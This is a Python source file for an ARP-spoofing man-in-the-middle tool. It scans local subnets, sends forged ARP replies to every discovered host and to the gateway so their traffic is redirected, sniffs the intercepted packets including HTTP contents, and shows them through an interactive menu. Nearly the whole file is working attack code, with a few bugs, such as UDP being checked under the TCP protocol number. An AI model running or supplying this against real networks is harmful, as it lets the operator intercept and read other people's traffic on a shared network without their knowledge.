import socket
import struct
import uuid
import codecs
import binascii
from tabnanny import verbose
import psutil
import time
import os
from scapy.all import *
import scapy.config
import scapy.layers.l2
import scapy.route
import sys
import netifaces
import pandas as pd
from scapy.config import conf
from scapy.layers.l2 import ARP, Ether

#os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
conf.debug_dissector = 2

def get_default_gateway():
    """ python style if it exists there is a python lib that can do it in 3 lines of code """
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    return default_gateway

#return poperly formated mac adress
def get_mac_adress(bytes_addres):
    bytes_string = map('{:02x}'.format, bytes_addres)
    mac_adress = ':'.join(bytes_string).upper()
    return mac_adress

host_ip = socket.gethostbyname(socket.gethostname())
host_mac = ':'.join(format(x, '02x') for x in uuid.getnode().to_bytes(6, 'big')).upper()
gateway_ip = get_default_gateway()
gateway_mac = ''

# Return proper IPv4 addres
def ipv4(addres):
    return '.'.join(map(str, addres))

def parse_http(data):
    try:
        return data.decode('utf-8', errors='ignore')
    except UnicodeDecodeError:
        return data.decode('latin1', errors='ignore')

def Ethernet_frame(data):
    dest_mac, source_mac, proto = struct.unpack('! 6s 6s H', data[:14])
    return {'data': data[14:], 'dest_mac' : get_mac_adress(dest_mac), 'source_mac' : get_mac_adress(source_mac), 'eth_proto' : socket.htons(proto)}

def IPv4_packet(unpacked):
    data = unpacked['data']
    version_header_length = data[0]
    unpacked['version']  = version_header_length >> 4
    unpacked['header_length'] = (version_header_length & 15) * 4
    unpacked['time_to_live'], unpacked['proto'], src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    unpacked['src'], unpacked['target'], unpacked['data'] = ipv4(src), ipv4(target), data[unpacked['header_length']:]
    return unpacked

def ARP_packet(unpacked):
    data = unpacked['data']
    unpacked['HTYPE'], unpacked['PTYPE'], unpacked['HLEN'], unpacked['PLEN'],unpacked['operation'], b_SHA, b_SPA, b_THA, b_TPA = struct.unpack('! H H B B H 6s 4s 6s 4s', data)
    unpacked['SHA'], unpacked['SPA'], unpacked['THA'], unpacked['TPA'] = get_mac_adress(b_SHA), ipv4(b_SPA), get_mac_adress(b_THA), ipv4(b_TPA)
    return unpacked

def ICMP_packet(unpacked):
    data = unpacked['data']
    unpacked['icmp_type'], unpacked['code'], unpacked['checksumm'] = struct.unpack('! B B H', data[:4])
    unpacked['data'] = data[4:]
    return unpacked

def TCP_packet(unpacked):
    data = unpacked['data']
    unpacked['src_port'], unpacked['dest_port'], unpacked['sequence'], unpacked['aknowledgment'], unpacked['offset_reseved_flags'] = struct.unpack('! H H L L H', data[:14])
    offset = (unpacked['offset_reseved_flags'] >> 12) * 4
    unpacked['flag_urg'] = (unpacked['offset_reseved_flags'] & 32) >> 5
    unpacked['flag_ack'] = (unpacked['offset_reseved_flags'] & 16) >> 4
    unpacked['flag_psh'] = (unpacked['offset_reseved_flags'] & 8) >> 3
    unpacked['flag_rst'] = (unpacked['offset_reseved_flags'] & 4) >> 2
    unpacked['flag_syn'] = (unpacked['offset_reseved_flags'] & 2) >> 1
    unpacked['flag_fin'] = unpacked['offset_reseved_flags'] & 1
    unpacked['data'] = data[offset:]
    return unpacked

def UDP_packet(unpacked):
    data = unpacked['data']
    unpacked['src_port'], unpacked['dest_port'], unpacked['size'] = struct.unpack('! H H 2x H', data[:8])
    unpacked['data'] = data[8:]
    return unpacked

def HTTP_packet(unpacked):
    data = unpacked['data']
    unpacked['http_string'] = parse_http(data)
    unpacked['data'] = b''
    return unpacked

def long2net(arg):
    if (arg <= 0 or arg >= 0xFFFFFFFF):
        raise ValueError("illegal netmask value", hex(arg))
    return 32 - int(round(math.log(0xFFFFFFFF - arg, 2)))


def to_CIDR_notation(bytes_network, bytes_netmask):
    network = scapy.utils.ltoa(bytes_network)
    netmask = long2net(bytes_netmask)
    net = "%s/%s" % (network, netmask)
    if netmask < 16:
        return None
    return net

def scan(net, interface, timeout=5):
    ret = []
    try:
        ans, unans = scapy.layers.l2.arping(net, iface=interface, timeout=timeout, verbose=False)
        for s, r in ans.res:
            line = [r.src, r.psrc]
            try:
                ret.append(line)
            except socket.herror:
                pass
    except socket.error as e:
        raise
    return ret

class Client():
    def __init__(self, ip, mac):
        self.ip = ip
        self.mac = mac
        self.type = (self.ip == host_ip or self.ip == gateway_ip)
        self.arp_packets = 0
    def spoof(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = host_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc = host_mac), verbose=False)
    def restore(self):
        send(Ether(dst=self.mac)/ARP(op=2, pdst=self.ip, psrc=gateway_ip, hwdst=self.mac, hwsrc = gateway_mac), verbose=False)
        send(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=self.ip, hwdst=gateway_mac, hwsrc=self.mac), verbose=False)
    def fire(self):
        try:
            self.spoof()
        except:
            self.restore()

class IPtable():
    def __init__(self, host_mac, host_ip, gateway_ip, gateway_mac):
        self.mac = host_mac
        self.ip = host_ip
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients = [Client(self.ip, self.mac), Client(self.gateway_ip, self.gateway_mac)]

    def find(self, client):
        for i, c in enumerate(self.clients):
            if (c.ip == client.ip):
                return i
        return -1

    def emplase(self, client):
        if (self.find(client) == -1):
            self.clients.append(client)

    def scan(self):
        ips = []
        for network, netmask, _, interface, address, _ in scapy.config.conf.route.routes:
            # skip loopback network and default gw
            if network == 0 or interface == 'lo' or address == '127.0.0.1' or address == '0.0.0.0':
                continue
            if netmask <= 0 or netmask == 0xFFFFFFFF:
                continue
            # skip docker interface
            if (interface.startswith('docker')
                    or interface.startswith('br-')
                    or interface.startswith('tun')):
                continue
            net = to_CIDR_notation(network, netmask)
            if net:   
                i = scan(net, interface)
                for line in i:
                    ips.append([line[0].upper(), line[1]])
        for i in ips:
            self.emplase(Client(i[1], i[0]))

    def attack(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.fire()

    def restore(self):
        for client in self.clients:
            if (client.type == False):
                for i in range(20):
                    client.restore()

class Database():
    def __init__(self):
        self.Ethernet_frames = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[]})
        self.ARP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'SHA':[], 'SPA':[], 'THA':[], 'TPA':[]})
        self.IP_v4_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[]})
        self.ICMP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'icmp_type':[],'code':[], 'checksumm':[]})
        self.UDP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'size':[]})
        self.TCP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'bflag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[]})
        self.HTTP_packets = pd.DataFrame({'data': [], 'dest_mac':[], 'source_mac':[], 'eth_proto':[], 'version':[], 'header_length':[], 'time_to_live':[], 'proto':[], 'src':[], 'target':[], 'src_port':[], 'dest_port':[], 'sequence':[], 'aknowledgment':[], 'offset_reseved_flags':[], 'flag_urg':[], 'bflag_ack':[], 'flag_psh':[], 'flag_rst':[], 'flag_syn':[], 'flag_fin':[], 'http_string':[]})
    def insert_data(self, data):
        unpacked = Ethernet_frame(data)
        if (len(unpacked['data']) >= 20 and unpacked['eth_proto'] == 8):
            unpacked = IPv4_packet(unpacked)
            if (unpacked['proto'] == 1 and len(unpacked['data']) >= 4):
                unpacked = ICMP_packet(unpacked)
                unpacked['data'] = str(unpacked['data'])
                self.ICMP_packets.loc[self.ICMP_packets.shape[0]] = unpacked
            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 14):
                unpacked = TCP_packet(unpacked)
                if (b'HTTP' in unpacked['data'] and len(unpacked['data']) > 0):
                    unpacked = HTTP_packet(unpacked)
                    unpacked['data'] = str(unpacked['data'])
                    self.HTTP_packets.loc[self.HTTP_packets.shape[0]] = unpacked
                else:
                    unpacked['data'] = str(unpacked['data'])
                    self.TCP_packets.loc[self.TCP_packets.shape[0]] = unpacked
            elif (unpacked['proto'] == 6 and len(unpacked['data']) >= 8):
                unpacked = UDP_packet(unpacked)
                unpacked['data'] = str(unpacked['data'])
                self.UDP_packets.loc[self.UDP_packets.shape[0]] = unpacked
            else:
                unpacked['data'] = str(unpacked['data'])
                self.IP_v4_packets.loc[self.IP_v4_packets.shape[0]] = unpacked
        elif (len(unpacked['data']) == 28 and unpacked['eth_proto'] == 1544 ):
            unpacked = ARP_packet(unpacked)
            unpacked['data'] = str(unpacked['data'])
            self.ARP_packets.loc[self.ARP_packets.shape[0]] = unpacked
        else:
            unpacked['data'] = str(unpacked['data'])
            self.Ethernet_frames.loc[self.Ethernet_frames.shape[0]] = unpacked


def Sniff(db):
    while(True):
        try:
            sniff(prn=lambda x: db.insert_data(x.do_build()), count=0, session = DefaultSession)
        except:
            continue


if __name__ == "__main__":
    gateway_mac = getmacbyip(gateway_ip).upper()
    Ips = IPtable(host_mac, host_ip, gateway_ip, gateway_mac)
    Ips.scan()
    db = Database()
    th_sniff = threading.Thread(target=Sniff, args=(db, ), daemon=True)
    th_sniff.start()
    try:
        Ips.attack()
        command = ''
        while (command != 'exit'):
            command = input('input command: ')
            if command == 'help':
                print("print 'ips' to get list of ips")
                print("print 'packets' to get list of spoofed packets")
                print("print 'exit' to exit")
            if command == 'ips':
                for i in Ips.clients:
                    print(i.ip, i.mac)
            if command == 'packets':
                print(1, 'Ethernet_frames:', db.Ethernet_frames.size)
                print(2, 'ARP_packets:', db.ARP_packets.size)
                print(3, 'IP_v4_packets:', db.IP_v4_packets.size)
                print(4, 'ICMP_packets:', db.ICMP_packets.size)
                print(5, 'UDP_packets:', db.UDP_packets.size)
                print(6, 'TCP_packets:', db.TCP_packets.size)
                print(7, 'HTTP_packets:', db.HTTP_packets.size)
                choice = ''
                while (choice != 'back' and (choice.isdigit() == False or (int(choice) < 1 or int(choice) > 7))):
                    choice = input('choose type: ')
                if (choice == 'back'):
                    continue
                choice = int(choice)
                if (choice == 1):
                    print(db.Ethernet_frames)
                elif (choice == 2):
                    print(db.ARP_packets)
                elif (choice == 3):
                    print(db.IP_v4_packets)
                elif (choice == 4):
                    print(db.ICMP_packets)
                elif (choice == 5):
                    print(db.UDP_packets)
                elif (choice == 6):
                    print(db.TCP_packets)
                elif (choice == 7):
                    print(db.HTTP_packets)
                
        Ips.restore()
    except:
        Ips.restore()
        raise()